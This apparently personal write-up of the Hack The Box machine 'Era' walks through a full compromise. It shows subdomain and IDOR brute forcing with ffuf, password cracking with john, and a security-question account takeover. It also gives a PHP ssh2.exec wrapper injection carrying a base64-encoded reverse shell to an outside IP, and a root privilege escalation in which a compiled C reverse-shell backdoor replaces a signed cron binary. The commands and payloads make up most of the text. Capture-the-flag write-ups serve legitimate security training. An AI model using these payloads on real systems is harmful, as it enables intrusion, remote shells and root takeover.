---
title: Era
published: 2025-11-14
description: ''
image: ''
tags: ['Medium','Linux','Web','Privsec']
category: 'HTB'
draft: false 
---

## Enumeration
> - Lets use nmap :
```bash
nmap -sCV -A -T4 era.htb
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Era Designs
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

> - Brute Force Subdomains :
```sh
ffuf -u http://FUZZ.era.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o ffuf-subdomain.era.htb.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.era.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Output file      : ffuf-subdomain.era.htb.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 110ms]
```
![file](./Era-Images/file-era.png)

> - We found a login page , register and login using security questions.!
> - I create account {admin:admin} & Sign in .
> - I found a upload files , i do this and i have a direction for download my files .
> ![file](./Era-Images/number.png)

- Now My idea is : i create a number list 0-8000 and im brute forcing for id files like ***IDOR***

```sh
   sudo ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w id.txt -H 'Cookie: PHPSESSID=m3do1n6c2tdn215b6s04h4cj8h' -fw 3161

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /home/hijacked/CTF/OFFENSIVE/HTB/Era/id.txt
 :: Header           : Cookie: PHPSESSID=m3do1n6c2tdn215b6s04h4cj8h
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3161
________________________________________________

****                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 110ms]
****                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 111ms]
```

> - I download a Backup folder zip and i have a Databases and more files important !!!

> - Now i use JOHN-THE-RIPPER For cracking passwords

###### CMD : `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

> - Now login a user and password 
> - Go to 'Update Security Questions' to change : {admin_ef01cab31aa|admin|admin|admin} Save thats
> - After that log out and login in 'Security Questions' not user&password .

## Exploitation

- I Login to FTP i have this information files :
```sh
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 .
drwxr-xr-x    4 0        114          4096 Jul 22 08:42 ..
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
226 Directory send OK.
```
> - It is found that when the user ID is 1, that is, the admin user can perform special operations.
```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
```
    Administrators can pass. ?show=true&format=php://filter/...Access any local file content
    Risk of arbitrary file reading (LFI), in particular php://filteror data://
    If the user can control formatand idCollaborate wrapper . $fileIn combination, there will be serious loopholes.

> - Great i show i file name is `ssh2.so` is : an extension of ssh2, using reference PHP manual: PHP: Supported protocols and encapsulation protocols - Manual

    ssh2.shell://user:pass@example.com:22/xterm
    ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
    ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14
    ssh2.sftp://user:pass@example.com:22/path/to/filename

- Try the following payload to rebound the shell, because it is the base64 encoding after the incoming URL, so try to avoid the existence of the plus sign (which will be resolved to space), the solution is to insert the elimination code plus number before the base64 encoding.

```sh
http://file.era.htb/download.php?id=**&show=true&format=ssh2.exec://user:pass@127.0.0.1/bash%20-c%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMjA1LzQ0NDQgMD4mMSkgJg==|base64%20-d|bash%27;
```
## Reverse-Shell

> ![file](./Era-Images/user.png)
> - Now i Found user.txt , For privilege Escalation i use `Linpeas` but i find a Crontab in `/opt/AV/periodic-checks/monitor`

> - So, My idea is a Can create a shell in `C` like shell.c:
```c
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");
    return 0;
}
```
> - Use Command `gcc shell.c -o backdoor'
> - Remove File `monitor` and type 
```sh
objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
objcopy --add-section .text_sig=text_sig backdoor
cp backdoor  monitor
chmod +x monitor 
./monitor
```
## Congratulation Root !!!

